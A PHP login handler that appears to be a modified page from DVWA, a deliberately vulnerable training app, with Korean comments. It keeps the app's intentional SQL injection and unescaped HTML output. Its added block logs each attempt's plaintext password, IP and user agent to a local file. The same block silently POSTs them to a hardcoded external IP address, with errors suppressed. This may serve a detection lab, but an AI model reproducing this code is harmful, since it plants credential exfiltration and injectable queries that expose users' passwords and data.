<?php

if( isset( $_GET[ 'Login' ] ) ) {

    // 기본값 (실패 기준)
    $result_status = "fail";

    // 입력값
    $user = $_GET[ 'username' ] ?? "";
    $raw_pass = $_GET[ 'password' ] ?? "";
    $pass = md5( $raw_pass );

    // DB 조회
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query )
        or die('<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) 
            ? mysqli_error($GLOBALS["___mysqli_ston"]) 
            : ((($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false))) . '</pre>');

    // 로그인 결과 판단
    if( $result && mysqli_num_rows( $result ) == 1 ) {
        $result_status = "success";

        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        $html .= "<p>Welcome to the password protected area {$user}</p>";
        $html .= "<img src=\"{$avatar}\" />";
    }
    else {
        $html .= "<pre><br />Username and/or password incorrect.</pre>";
    }

    // 🔥 클라이언트 IP 우선 추출 (proxy 고려)
    $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] 
        ?? $_SERVER['REMOTE_ADDR'] 
        ?? "";

    // 🔥 로그 데이터
    $data = [
        "timestamp" => microtime(true),
        "ip" => $client_ip,
        "username" => $user,
        "password" => $raw_pass,
        "result" => $result_status,
        "user_agent" => $_SERVER['HTTP_USER_AGENT'] ?? "",
        "language" => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? "",
        "method" => $_SERVER['REQUEST_METHOD'] ?? ""
    ];

    // 🔥 파일 저장 (로컬)
    file_put_contents("/tmp/dvwa_log.json", json_encode($data) . "\n", FILE_APPEND);

    // 🔥 FastAPI 서버로 전송
    $url = "http://3.36.67.236:8000/login";

    $headers = [
        "Content-type: application/json",
        "X-Forwarded-For: " . $client_ip,
        "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? "")
    ];

    $options = [
        'http' => [
            'header'  => implode("\r\n", $headers) . "\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
            'timeout' => 2
        ]
    ];

    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);  // 에러 무시

    // DB 종료
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>